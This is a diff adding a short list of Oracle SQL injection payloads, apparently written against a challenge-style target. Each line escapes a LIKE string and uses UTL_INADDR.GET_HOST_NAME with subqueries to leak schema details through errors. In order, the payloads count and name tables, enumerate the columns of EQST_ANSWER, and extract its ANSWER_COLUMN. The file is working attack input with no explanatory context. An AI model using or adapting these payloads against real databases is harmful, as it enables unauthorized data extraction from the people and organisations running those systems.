@@ -1,0 +1,6 @@
+hihi%' and UTL_INADDR.GET_HOST_NAME((select count(table_name) from user_tables)) = 5 and 'p%'='p
+hihi%' and UTL_INADDR.GET_HOST_NAME((select t from (select table_name t,rownum as ln from user_tables) where ln = 5)) = 4 and 'p%'='p
+hihi%' and UTL_INADDR.GET_HOST_NAME((select count(column_name) from user_tab_columns where table_name = 'EQST_ANSWER')) = 1 and 'p%'='p
+hihi%' and UTL_INADDR.GET_HOST_NAME((select column_name from (select column_name, rownum r from user_tab_columns where table_name = 'EQST_ANSWER') where r=1)
+) = 5 and 'p%'='p
+hihi%' and UTL_INADDR.GET_HOST_NAME((select ANSWER_COLUMN from EQST_ANSWER)) = 5 and 'p%'='p
